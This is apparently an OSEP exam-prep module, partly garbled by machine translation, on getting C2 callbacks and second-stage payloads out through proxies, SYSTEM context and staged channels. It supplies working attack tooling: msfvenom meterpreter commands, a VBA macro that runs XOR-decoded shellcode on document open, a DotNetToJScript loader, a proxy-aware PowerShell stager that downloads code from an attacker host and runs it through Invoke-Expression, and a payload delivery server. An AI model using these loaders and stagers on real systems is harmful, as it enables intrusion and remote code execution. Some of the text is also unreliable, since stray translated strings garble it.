::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# Module 09 — C2 callbacks and egress channels (staged / proxy / DNS / domain fronting)

User vs SYSTEM proxy. Every stage of a staged payload uses the same proven path.

> **Covers scenarios:** 17, 28, 29, 30, 31, 32, 33
>
> **Prerequisites:** attacker box (Kali) + an entry session; HTTPS needs a self-signed certificate (see [00-environment-and-infra](/modules/00-environment-and-infra) §3); DNS channel needs a domain whose NS points at you, or lab-allowed direct UDP/53; domain fronting needs a CDN/nginx front-end that can forward by custom Host.

**Core idea**: This module solves "code runs but the session / stage 2 never comes back." Every approach hangs off one ** proven reachable path**— verify the path first (delivery, proxy, DNS resolution, TLS handshake), then make every stage use that same path. Changing address / port / protocol / proxy context mid-stream is just scenario 30 again.

---

## Scenario 17: Target has no stable egress; download-style stage 2 never arrives

**Situation**: The portal can execute code, but the target cannot access the file server, only releases a few addresses, and all macros/scripts/loaders that rely on temporary downloads fail.

**Assumptions**: Executable code portal (VBA/HTA/JScript, see M01-M03); we put the second stage on the extranet file server; DNS resolution on the target side or arbitrary outbound to the server failed; shellcode and runner are ready.

**Prepare (attacker)**: Make each portal payload into **two sets of coexistence**: embedded version (shellcode + runner is completed in a single file/single process, 0 external downloads) and downloaded version (stager takes the second stage → from the attack machine). Don't leave just one, it is very time-consuming to switch shapes and redo in the exam.

```bash
# Inline edition preparation: Generate shellcode (confirm the target number first, store x86/x64 separately)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f ps1 > ~/osep/payloads/win/x64/run.ps1
# Stick the shellcode segment into the runner (the embedded runner of M01/M03 has the insert shellcode here annotation bit reserved)
# Download Edition Preparation: stage 2 Deliver Server
cp ~/osep/payloads/win/x64/run.ps1 ~/osep/payloads/PAYLOAD
python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads # Request Log Confirmation "Do you really download"
```

**Procedure**:
1. First use harmless callback to confirm the entry execution (callback ping/nslookup/write a file, see M01), **don't** run the download version directly - if the callback can't go out, the download will fail.
2. Confirm the target outbound capability: Record which pathway passes from the target side `Test-NetConnection LHOST -Port 80/443`, `nslookup URL`.
3. Can → use the downloaded version of the stager (document `docs/01` scene 3, `docs/03` scene 9 download execution mode); can not → change the embedded version, embed the second stage directly into the runner single file delivery.
4. The embedded version is still too large/killed (Scenario 18–19).→ Use the "bridge + C # second stage" of M03 to move the heavyweight logic to the memory JScript/C #, and still do not download it.
5. After delivery, observe the m00 server log (with or without get) and the listening end (whether the session is established).

**Lab files**:
| File | Purpose | Key args |
|---|---|---|
| `m00-delivery-server.py` | Download Delivery + Request Log | `--port 80 --dir ~/osep/payloads` |
| `m01-shellcode-runner-vba-archbranch.vba` | Inline Reference (first determine the number of digits and then select the shellcode) | Sticky Shellcode Segment |
| `m03-dotnettojscript-loader.js` | Embedded stage 2 Bridging Reference | Sticky C # payload |
| `m09-proxy-aware-downloader.ps1` | Downloader when downloading the system agent | See Scene 28 |

#### `m00-delivery-server.py` {#m00-delivery-server-py}

````python
#!/usr/bin/env python3
"""Purpose: Delivery server——HTTP/HTTPS Two channels to record the origin of each request, User-Agent, Path to confirm"Is the target actually downloading?"

Scenario: General infrastructure (cooperating) docs/00-environment-and-infra.md；Support the scene 3, 8, 15, 16, 17, 28, 30, 31 Other Organiser）

Dependency: Python 3.7+（Standard library）；HTTPS Yes. cert/key（Available openssl or m00-build-payloads.sh Generate）

Use: 
    # HTTP（Default 80）
    python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads

    # HTTPS（Automatically）
    python3 m00-delivery-server.py --port 443 --dir ~/osep/payloads \
        --cert ~/osep/tools/cert.pem --key ~/osep/tools/key.pem

    # Detection mode only: not return file, only record request (confirm target access path)）
    python3 m00-delivery-server.py --port 8000 --probe-only

Placeholder: LHOST=Attack aircraft IP（Scripts are available for printing URL）；PAYLOAD=Put it on. --dir Load File Name for Below

Test status: Already macOS Current Python 3 Syntax Validation（py_compile）；HTTP Mode to run validation directly
"""
from __future__ import annotations

import argparse
import datetime
import http.server
import os
import socket
import ssl
import sys
import threading

class LoggedHandler(http.server.SimpleHTTPRequestHandler):
    """Static file service with structured logs；probe-only Mode only record not returning files。"""

    probe_only = False
    log_path = "delivery.log"
    server_version = "DeliveryServer/1.0"
    _lock = threading.Lock()

    def _client(self) -> str:
        return f"{self.client_address[0]}:{self.client_address[1]}"

    def _record(self, method: str, status: int, note: str = "") -> None:
        stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ua = self.headers.get("User-Agent", "-")
        host = self.headers.get("Host", "-")
        line = f"{stamp}\t{self._client()}\t{method}\t{self.path}\t{status}\t{host}\t{ua}\t{note}"
        with self._lock:
            with open(self.log_path, "a", encoding="utf-8") as fh:
                fh.write(line + "\n")
        print(line, flush=True)

    def do_GET(self):  # noqa: N802
        if self.probe_only:
            self._record("GET", 200, "probe-only")
            body = b"ok\n"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        self._record("GET", 200)
        super().do_GET()

    def do_POST(self):  # noqa: N802
        length = int(self.headers.get("Content-Length", 0) or 0)
        data = self.rfile.read(length) if length else b""
        self._record("POST", 200, f"body={data[:200]!r}")
        body = b"ok\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_HEAD(self):  # noqa: N802
        self._record("HEAD", 200)
        super().do_HEAD()

    def log_message(self, fmt, *args):  # Cursor Default stderr Output, one step. _record
        return

def local_ips() -> list[str]:
    ips = set()
    try:
        hostname = socket.gethostname()
        for info in socket.getaddrinfo(hostname, None, socket.AF_INET):
            ips.add(info[4][0])
    except Exception:
        pass
    # Bottom: detect the default route exit address
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ips.add(s.getsockname()[0])
        s.close()
    except Exception:
        pass
    return sorted(ip for ip in ips if not ip.startswith("127."))

def main() -> int:
    ap = argparse.ArgumentParser(description="OSEP Organisation（HTTP/HTTPS + Request Log）")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--dir", default=os.path.expanduser("~/osep/payloads"))
    ap.add_argument("--cert", default="")
    ap.add_argument("--key", default="")
    ap.add_argument("--log", default="", help="Log path, default <dir>/../logs/delivery.log")
    ap.add_argument("--probe-only", action="store_true", help="Record requests only, do not return files")
    args = ap.parse_args()

    root = os.path.abspath(os.path.expanduser(args.dir))
    if not os.path.isdir(root):
        os.makedirs(root, exist_ok=True)
    log_path = args.log or os.path.join(os.path.dirname(root), "logs", "delivery.log")
    os.makedirs(os.path.dirname(log_path), exist_ok=True)

    LoggedHandler.probe_only = args.probe_only
    LoggedHandler.log_path = log_path

    handler = lambda *a, **kw: LoggedHandler(*a, directory=root, **kw)  # noqa: E731
    httpd = http.server.ThreadingHTTPServer((args.bind, args.port), handler)

    scheme = "http"
    if args.cert and args.key:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=os.path.expanduser(args.cert), keyfile=os.path.expanduser(args.key))
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
        scheme = "https"

    print(f"[*] Cannot initialise Evolution's mail component.: {root}")
    print(f"[*] Request Log:   {log_path}")
    print(f"[*] Mode:       {'probe-only（Record only）' if args.probe_only else 'File delivery'}")
    print("[*] Available Addresses:")
    for ip in local_ips():
        print(f"      {scheme}://{ip}:{args.port}/PAYLOAD")
    print("[*] Ctrl+C Stop")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopped")
    finally:
        httpd.server_close()
    return 0

if __name__ == "__main__":
    sys.exit(main())
````

#### `m01-shellcode-runner-vba-archbranch.vba` {#m01-shellcode-runner-vba-archbranch-vba}

````vb
' Purpose: Use VBA Compiler Constant Automatic Match Office Digits, to avoid mismatches between places Runner It caused the host to collapse.
' scene: 1（Place unknown"A trip."Version）
' Dependency: Office；x64 and x86 Two sets. shellcode（Individual XOR Encoded）
' Use: two paragraphs shellcode Fill separately GetX64Shellcode / GetX86Shellcode，Sticky ThisDocument Save After As .docm
' Placeholder: SHELLCODE_X64, SHELLCODE_X86（Bytes）, XOR_KEY
' Test status: Not present Windows Actual; manual check #If Win64 Compile branch writing
'
' Annotations: VBA Yes. #If Win64 Yes.**Compiled**Constant，Office You know when you add it. 32 Still? 64 bit，
'       So it's the same. .docm In two ways. Office You can run the branches. WMI More reliable detection.。
Option Explicit

Private Const XOR_KEY As Byte = &H2A

#If VBA7 Then
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
        ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
        ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, _
        ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, _
        ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
    Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" ( _
        ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As LongPtr)
    Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
        ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long
#Else
    Private Declare Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As Long, ByVal dwSize As Long, _
        ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function CreateThread Lib "kernel32" ( _
        ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, _
        ByVal lpStartAddress As Long, ByVal lpParameter As Long, _
        ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long
    Private Declare Sub RtlMoveMemory Lib "kernel32" ( _
        ByVal Destination As Long, ByRef Source As Any, ByVal Length As Long)
    Private Declare Function WaitForSingleObject Lib "kernel32" ( _
        ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
#End If

Sub RunShellcode()
    Dim sc() As Byte, i As Long

    #If Win64 Then
        sc = GetX64Shellcode()      ' 64 bit Office → x64 shellcode
    #Else
        sc = GetX86Shellcode()      ' 32 bit Office → x86 shellcode
    #End If

    For i = LBound(sc) To UBound(sc)
        sc(i) = sc(i) Xor XOR_KEY
    Next i

    Dim mem As LongPtr, hThread As LongPtr
    mem = VirtualAlloc(0, UBound(sc) + 1, &H3000, &H40)
    If mem = 0 Then Exit Sub
    RtlMoveMemory mem, sc(0), UBound(sc) + 1

    hThread = CreateThread(0, 0, mem, 0, 0, 0)
    If hThread = 0 Then Exit Sub
    WaitForSingleObject hThread, 1000
End Sub

Private Function GetX64Shellcode() As Byte()
    Dim tmp(3) As Byte
    tmp(0) = &H1B: tmp(1) = &H1B: tmp(2) = &H1B: tmp(3) = &H1B
    GetX64Shellcode = tmp
End Function

Private Function GetX86Shellcode() As Byte()
    Dim tmp(3) As Byte
    tmp(0) = &H1B: tmp(1) = &H1B: tmp(2) = &H1B: tmp(3) = &H1B
    GetX86Shellcode = tmp
End Function

Sub AutoOpen()
    RunShellcode
End Sub

Sub Document_Open()
    RunShellcode
End Sub
````

#### `m03-dotnettojscript-loader.js` {#m03-dotnettojscript-loader-js}

````javascript
/*
 * Use: DotNetToJScript Bones/poster containers for bridge products + Host pre-screening。
 *      DotNetToJScript.exe Yes. C# Sequencing complete program set runner.js（Hundreds of lines. base64），
 *      This document is used for: (a) Record standard generation command；(b) Do host places before delivery/.NET Pre-screen；
 *      (c) Paste the whole tool output to the bottom when manual assembly is required"Paste Area"。
 * scene: 9, 10（cheat sheet JScript > Meterpreter Loader with DotNetToJScript）
 * Dependence: Tools Windows + DotNetToJScript.exe；Objective WSH + .NET（v4 or v2）。
 * Use: 
 *  1) Generate a complete product (the product itself can run independently without this document）: 
 *       DotNetToJScript.exe .\payload.dll --lang=Jscript --ver=v4 -o runner.js
 *  2) Local pre-screening (read host information when the product is in the same directory as this document)）: 
 *       cscript //nologo m03-dotnettojscript-loader.js
 *  3) If manual pasting is required: Paste all the contents of the tool output below PASTE_BEGIN/PASTE_END Between，
 *     After saving cscript Run。
 * Placeholder: None (auto-read host information); tool products in the paste without handing over base64。
 * Test status: Host pre-check logic done JS Syntax Validation(node --check)；
 *     Production/activation needs to be Windows Experimental environment validation。
 */

// ===================== Host pre-inspection (read-only, no modification)） =====================
var fso = new ActiveXObject("Scripting.FileSystemObject");
var env = new ActiveXObject("WScript.Shell").Environment("Process");

WScript.Echo("[*] Host          : " + WScript.FullName);
WScript.Echo("[*] OS Structure   : " + env("PROCESSOR_ARCHITECTURE"));
// The host number determines the program set platform that can be loaded: 64 Host -> x64/AnyCPU；32 Host -> x86/AnyCPU
if (env("PROCESSOR_ARCHITECTURE") === "x86" &&
    env("PROCESSOR_ARCHITEW6432") === "AMD64") {
    WScript.Echo("[!] This process is 32 bit(Run on x64 OS)——Load Requirements x86 or AnyCPU");
}

// .NET Version Directory Detection: v4 Default exists；v2/v3.5 Enabled by function
var windir = env("WINDIR");
var net4 = windir + "\\Microsoft.NET\\Framework64\\v4.0.30319";
var net2 = windir + "\\Microsoft.NET\\Framework64\\v2.0.50727";
WScript.Echo("[*] .NET v4 Contents  : " + (fso.FolderExists(net4) ? "Existence" : "Missing"));
WScript.Echo("[*] .NET v2 Contents  : " + (fso.FolderExists(net2) ? "Existence" : "Missing"));
if (!fso.FolderExists(net4) && !fso.FolderExists(net2)) {
    WScript.Echo("[!] Not found .NET Framework Contents，DotNetToJScript v4/v2 The product can't run.");
    WScript.Quit(1);
}

// ===================== Paste Area =====================
// Put DotNetToJScript Full Generated JS Paste content here (with its own beginnings)
// var serialized_obj = "..." With subsequent inverse sequence/activated code) and delete the two rows below。
// Pay attention to the product itself and the host number./.NET Version Match（v2 Production needs .NET 2.0/3.5）。
// PASTE_BEGIN
WScript.Echo("[*] Paste Area is empty: Please run first DotNetToJScript Generate products，");
WScript.Echo("[*] Or directly. runner.js Delivery as attachment (recommended, no manual changes)）。");
WScript.Echo("[*] Top host information to confirm the product platform(--ver/Compiler Platform)Matches。");
// PASTE_END

WScript.Quit(0);
````

#### `m09-proxy-aware-downloader.ps1` {#m09-proxy-aware-downloader-ps1}

````powershell
<#
# Use: proxy sensor download/implementer. Automatic Read System Agent（WinINet User Context) or Under Visible Agent Load URL，
#       Support proxy authentication (current token passover) NTLM Or a diploma. Can only land files, memory execution or direct IEX Contents。
#       Overwrite scene: 28（System Agent + Proxy Authentication）, 29（User state and SYSTEM Contextual Agent Difference）, 
#       30（Proxy Path for Download stage 2）, 31（HTTPS + Certificate Validation Switch）。
# Dependency: PowerShell 5.1+（Windows）；No additional modules are required. Target needs to have access to a proxy. URL。
# Use: 
#   1) Automatic System Agent Downloads to File: 
#      powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url http://LHOST/PAYLOAD -OutFile C:\Windows\Temp\PAYLOAD
#   2) Automatic system proxy download and memory execution（stager Usage，IEX）: 
#      powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url http://LHOST/stage2.ps1 -Command
#   3) Visible Agent + Authentication: 
#      powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url https://LHOST/PAYLOAD -OutFile x.bin `
#          -ProxyUrl http://proxy.corp:8080 -ProxyUser DOMAIN\USER -ProxyPass PASS
#   4) Visible Agent + Current token authentication（NTLM Passage, domain user scenes are common）: 
#      powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url http://LHOST/stage2.ps1 -Command `
#          -ProxyUrl http://proxy.corp:8080 -DefaultCreds
#   5) Connectivity test only (download) 8 bytes and report proxy selection) without changing system settings: 
#      powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url http://LHOST/probe.txt -TestOnly
# Placeholder: LHOST=Attack aircraft IP，LPORT=Port，PAYLOAD=Organisation，DOMAIN\USER / PASS=Proxy，URL=https?://LHOST[:LPORT]/PAYLOAD
## Scenario 28: Normal users browse via proxy; custom payloads cannot callback directly
#           Subject to the context of the user of the experimental network SYSTEM Contextual Validation。SYSTEM Context Note: netsh winhttp and HKCU I don't know.。
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][string]$Url,
    [string]$OutFile = "",
    [switch]$Command,          # Download content directly IEX（Memory execution, no landing）
    [switch]$TestOnly,         # Only detect connectivity: download small documents and report the agents used, not implement content
    [string]$ProxyUrl = "",    # Visible Agent http://host:port（Priority over system agent）
    [string]$ProxyUser = "",   # Organisation（DOMAIN\user or user）
    [string]$ProxyPass = "",
    [switch]$DefaultCreds,     # Could not close temporary folder: %s（NTLM Passage）
    [switch]$SkipCertCheck,    # Skip TLS Validation of certificates (from visa documents; no target only) MITM You can check it.）
    [int]$TimeoutSec = 20
)

$ErrorActionPreference = "Stop"

# ---- TLS 1.2 + Could not initialise Bonobo ----
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
if ($SkipCertCheck) {
    Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert,
        WebRequest req, int problem) { return true; }
}
"@
    [Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
}

function Get-EffectiveProxy([string]$targetUrl) {
    # Priority: visible ProxyUrl > System Agent（WinINet/HKCU）> Straight Company
    if ($ProxyUrl) {
        $p = New-Object Net.WebProxy($ProxyUrl)
        $p.BypassProxyOnLocal = $false
        return $p
    }
    try {
        $sys = [Net.WebRequest]::GetSystemWebProxy()
        $sys.Credentials = [Net.CredentialCache]::DefaultCredentials
        $u = $sys.GetProxy([uri]$targetUrl)
        if ($u -and $u.AbsoluteUri -ne $targetUrl) { return $sys }
    } catch { Write-Warning "[!] Reading system agent failed (possibly none) HKCU Proxy Settings）: $($_.Exception.Message)" }
    Write-Host "[*] No system agent found, direct connection. $targetUrl" -ForegroundColor Cyan
    return $null
}

Write-Host "[*] Objective URL : $Url"
Write-Host "[*] Current Identity : $([Environment]::UserDomainName)\$([Environment]::UserName)  (SYSTEM Note agency differences in context)"

$wc = New-Object Net.WebClient
$proxy = Get-EffectiveProxy $Url
if ($null -ne $proxy) {
    if ($DefaultCreds) { $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials }
    elseif ($ProxyUser) {
        if ($ProxyUser -match '\\') {
            $d, $u = $ProxyUser.Split('\')
            $proxy.Credentials = New-Object Net.NetworkCredential($u, $ProxyPass, $d)
        } else {
            $proxy.Credentials = New-Object Net.NetworkCredential($ProxyUser, $ProxyPass)
        }
    }
    $wc.Proxy = $proxy
    Write-Host "[*] Use proxy : $($proxy.Address)" -ForegroundColor Cyan
} else {
    $wc.Proxy = $null   # Straight Company
}
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

try {
    if ($TestOnly) {
        # Detection mode: request HEAD/Small GET，It's only about getting to the attacker. m00-delivery-server Log Check）
        $resp = $wc.DownloadData($Url)
        Write-Host "[+] Connectivity OK: Copy that. $($resp.Length) Bytes (From $Url)" -ForegroundColor Green
        exit 0
    }
    if ($Command) {
        Write-Host "[*] Memory Download and Execute : $Url"
        $code = $wc.DownloadString($Url)
        Write-Host "[+] Content acquired $($code.Length) Characters, start IEX ..." -ForegroundColor Green
        Invoke-Expression $code
    } elseif ($OutFile) {
        Write-Host "[*] Download to File : $OutFile"
        $dir = Split-Path -Parent $OutFile
        if ($dir -and -not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
        $wc.DownloadFile($Url, $OutFile)
        if ((Get-Item $OutFile).Length -gt 0) {
            Write-Host "[+] Saved $(Get-Item $OutFile).Length Bytes -> $OutFile" -ForegroundColor Green
        } else {
            Write-Error "[-] File empty, download may be intercepted by proxy/server"
        }
    } else {
        Write-Error "[-] Please specify -OutFile, -Command or -TestOnly One of three."
    }
} catch [Net.WebException] {
    $code = $_.Exception.Response.StatusCode.value__
    if ($code -eq 407) {
        Write-Host "[-] Proxy authentication failed(407): Try -DefaultCreds（NTLM or -ProxyUser DOMAIN\USER -ProxyPass PASS" -ForegroundColor Red
    } elseif ($code -eq 403) {
        Write-Host "[-] Rejected by proxy/server(403): Switch UA/path, or confirm that URL Whether to be released by white list (scenes) 31/33）" -ForegroundColor Red
    } else {
        Write-Host "[-] Request Failed HTTP $code : $Url（Check system agent, scene. 28）" -ForegroundColor Red
    }
    Write-Host "[-] Details : $($_.Exception.Message)" -ForegroundColor Red
    if ($_.Exception.InnerException) { Write-Host "[-] Internal : $($_.Exception.InnerException.Message)" }
    exit 1
} catch {
    Write-Host "[-] Unexpected error : $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}
````

**Verify**: get → download link pass of the target IP appears in the m00 log; the session → full link pass appears on the listening end; when there is no log/session, check whether the portal is not executed or blocked from the network by comparing the "callback three-piece set".

**If it fails / alternatives**:
- The target is completely out of the network (including DNS out of the network is not possible),→ abandon the reconnection type scheme, and change to "offline landing type": landing + planned task/service is resident, and the result writing file is retrieved from another entrance (M01 Scenario 5).
- Only a few domains/ports are allowed to → walk the proxy (Scene 28) or domain prefix (Scene 33) or HTTPS 443 (Scene 31).
- The embedded version is executed but the number of seconds → does not match or the schema error occurs when the shellcode is generated, using the archbranch version (M01).

**Exam notes / OPSEC**: Both embedded and downloaded versions are saved and annotated in ** different directories**to avoid wasting 10 minutes throwing the wrong file; embedded shellcode has static features by default, and is encoded/encrypted according to M05 when needed; "can execute code ≠ can get out of the net", verify the path first and then run payload.

---


**Situation**: The target is only allowed to access the extranet through the corporate proxy, the browser is normal, direct TCP or ignore the proxy HTTP client failed.

**Assumptions**: There is a normal user session and can execute PowerShell; the target is configured with a system/user agent (HKCU Internet Settings or browser built-in proxy); the proxy may require NTLM authentication (domain user context is usually transparent).

**Prepare (attacker)**: Start the drop server/HTTPS snooping (m00 or m09-https-listener.sh); read the proxy configuration from the target side first to confirm whether the proxy can reach your address.

```powershell
# Target side: Read user agent settings (WinINet)
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable
```

**Procedure**:
1. Use `m09-proxy-aware-downloader.ps1` for connectivity testing: the default mode automatically fetches the system proxy and downloads a harmless file (get can be seen in the m00 log).
2. 407 (Proxy authentication failed)→ Add `-ProxyUser domain\ user -ProxyPass pass` (or `-DefaultCreds` to transparent NTLM with the current token).
3. After confirming that it can be downloaded, use the same path for the backlink: the port/address of the HTTPS reverse handler should be walked (443 is the most stable); the same proxy parameters are added to the PowerShell stager download execution.
4. Record "User Context + Proxy → Pass" to compare Scenario 29.

**Lab files**:
| File | Purpose | Key args |
|---|---|---|
| `m09-proxy-aware-downloader.ps1` | System Proxy/Explicit Proxy Download with Authentication | `-Url http://lhost/payload -OutFile' or `-Command` |
| `m00-delivery-server.py` | Deliver + Confirm Target Request | `--port 80 --dir ~/osep/payloads` |

**Verify**: get from proxy/target appears in the m00 log; there is a callback output after execution of the script downloaded in `-Command` mode; the contents of the test file are consistent with the source.

**If it fails / alternatives**:
- The browser uses a built-in proxy (Firefox is configured separately) and the system proxy is empty. Read the proxy address → from the browser settings and use the explicit `-ProxyUrl http://proxy: port` instead.
- The proxy wants to authenticate and the current token does not → use the known credentials` -ProxyUser/-ProxyPass`; only the plaintext HTTP proxy will expose the credentials to the proxy, try to make the traffic HTTPS.
- The proxy only releases whitelisted domains → domain prefix (Scenario 33) or DNS (Scenario 32).

**Exam notes / OPSEC**: The proxy log can see that the destination URL → download stage uses the non-featured file name, and the reconnection stage goes back to HTTPS. Keep the UA consistent in the same session (the m09 script defaults to browser UA). Do not leave the clear text of the domain credentials in the command line history, and use `-DefaultCreds` if necessary.

---

## Scenario 29: User-context session callbacks; after SYSTEM elevation the channel dies

**Situation**: The same machine, the same address, the communication in advance is normal, and the system identity fails - the proxy settings and authentication contexts for the two identities are different.

**Assumptions**: The system (service, scheduled task, token replication, etc.) has been raised from the user session; the enterprise outbound network must be proxied; the user profile proxy is configured in HKCU (WinINet), and the system defaults to WinHTTP (`netsh winhttp`). The two ** do not share**, and the system does not have the user's credential context.

**Prepare (attacker)**: Start listening; compare the outputs of the two proxy chains on the target side first:

```cmd
rem target side (user shell)
netsh winhttp show proxy rem system/machine level WinHTTP proxy settings
reg query "HKCU\...\ Internet Settings"/v ProxyServer rem user WinINet settings

rem system context (after service entry or PsExec -s)
whoami rem confirms nt authority\ system
netsh winhttp show proxy
```

**Procedure**:
1. Record the evidence of "user + agent" in advance (output of scenario 28).
2. After raising the rights, do the minimum verification first: whether the direct TCP/download passes under system. If not, check whether the WinHTTP proxy is empty/inconsistent with the user.
3. Scheme A (change machine proxy, need administrator, system already has it): `netsh winhttp set proxy proxy-server = "http://proxy: 8080" bypass-list = "&lt;local&gt;"`, first note the original value of `netsh winhttp show proxy` for easy rollback, use `netsh winhttp reset proxy`.
4. Option B (no machine change): In the system session, use the downloader/client (`m09-proxy-aware-downloader.ps1 -ProxyUrl... -ProxyUser...`) that supports explicit proxy parameters, and let each component bring its own proxy.
5. Scheme C (Authentication Context Problem): If the agent fails anonymous/NTLM authentication of system, the payload that needs to be out of the network is returned to the user context for execution (such as the scheduled task running as a user), or the channel that does not require agent authentication is taken (DNS scenario 32).
6. After the return connection path is passed, let the handler enter the second stage, and record the agent parameters throughout the process.

**Lab files**:
| File | Purpose | Key args |
|---|---|---|
| `m09-proxy-aware-downloader.ps1` | Dual context downloader; explicit proxy under system | `-ProxyUrl http://proxy: 8080 -DefaultCreds` |
| `m00-delivery-server.py` | Verify that system is really requesting a delivery address | `--port 80` |

**Verify**: get appears in the m00 log under the system context; or `netsh winhttp show proxy` shows that the proxy has been set and the reconnection is successful; the difference in the output of the control group (before/after the change) should be explained.

**If it fails / alternatives**:
- Changing the machine proxy is not allowed (will break the system service out of the network)→ with the M08 tunnel: forwarding at the target reachable location, let the traffic through the user context/springboard.
- The proxy performs a network segment, or swaps a DNS channel, for a process with credentials derived from a → user context for which system has no credentials available.
- The invocation portal itself is triggered when the proxy parameters are written → to the payload command line in a non-interactive form such as service restart.

**Exam notes / OPSEC**: `netsh winhttp set proxy` affects **the whole machine**, which may affect other services in the test network and even be judged as disruptive - be sure to save the original value and use up the reset; system backlash as much as possible 443/80 regular ports; test and record the two paths "user vs system" once, do not waste time repeatedly testing the parameters of the user mode under system.

---

## Scenario 30: Stage 1 callbacks succeed; stage 2 never appears

**Situation**: The portal successfully contacts the listening end, but another address/port/protocol is used in the subsequent stage, and that path is not allowed by the target or is not configured at all.

**Assumptions**: stage 1 (stager/callback) is passed; monitoring and delivery infrastructure is planned on the attack machine side according to `docs/00` fixed port (80 deliveries, 443 reconnections, 4444 standby).

**Prepare (attacker)**: Create a "path card" for each session with fixed fields: Portal → Download Address/Protocol/Port → Listen Address/Protocol/Port → Proxy Context → UA. Changing the path of any stage is performed after changing the card.

**Procedure**:
1. Locate the breakpoint: If the second stage is "download execution", see if the m00/nginx log has a second stage get from the target; no → target did not go to the download address; there is but no session → execution/digit problem (go to M05).
2. Common root causes are excluded item by item:
- Inconsistent address: LHOST written in the stager is an intranet address or localhost, listening on another network card - the same IP card is used.
- Port inconsistency: LPORT = 4444 when generating payload, listen on at 443.
- Protocol inconsistency: stage 1 HTTP passes, stage 2 reverse_https is exported to block → all phases with an authenticated protocol (443/HTTPS or proxy path).
- Agent context: the first stage can be downloaded in the user context, the second stage is triggered by system (see scenario 29).
- Delivery server not started/directory name incorrect/`payload` file name case or path mismatch.
3. The most stable practice: **stageless** (one connection with all) instead of staged (first connected and then retrieved), to avoid the second stage is inherently dependent on the second path; when it must be staged, two stages go to the same delivery server and the same URL template.
4. Set `set ExitOnSession false` on the listening end to avoid turning off the entire handler when the first session is broken.

**Lab files**:
| File | Purpose | Key args |
|---|---|---|
| `m09-https-listener.sh` | Unified HTTPS/HTTP handler entry | `--mode msf --payload windows/x64/meterpreter/reverse_https` |
| `m00-delivery-server.py` | Second-stage delivery + request logs | `--port 80 --dir ~/osep/payloads` |
| `m09-proxy-aware-downloader.ps1` | Stage 2 downloads need to be proxied | `-Url http://lost/payload -Command` |

#### `m09-https-listener.sh` {#m09-https-listener-sh}

````bash
#!/usr/bin/env bash
# Purpose: Attack side HTTPS Listen / TLS Termination of forwarding / HTTPS A single portal for delivery.
#       —— openssl Generate visa，socat / stunnel / sslh / python3 Rise TLS Listen and forward locally handler
# scenarios: 31（Target only allowed HTTPS and TLS Shake hands or request to be checked）, 30（Integrated phased communications 443）, 
#       33（Backend in Domain Prefix HTTPS Listening/delivered）, 15/17（Yes. HTTPS The second stage of delivery）
# Dependency: openssl（Choose, produce certificates and detect.）；
#       Transmittal tool selected automatically according to priority: socat > stunnel4 > python3（Internal ssl Forward, zero installation）；
#       --tool sslh For Passthrough Mode (inexplicable) TLS，Give the flow locally. msf reverse_https handler）；
#       --mode msf Yes. msfconsole；--mode serve Yes. python3
# Use: 
#   bash m09-https-listener.sh --mode cert --domain DOMAIN                # Only create a visa and print fingerprints
#   bash m09-https-listener.sh --mode ssl-test --port 8443 --to 4444      # TLS 8443 → Other Organiser 4444 handler
#   bash m09-https-listener.sh --mode serve  --port 443                   # HTTPS Delivery (records) UA，Logging --outdir）
#   bash m09-https-listener.sh --mode msf   --port 443 --lhost LHOST      # Generate and run msf reverse_https handler
#   bash m09-https-listener.sh -h                                         # Full Help
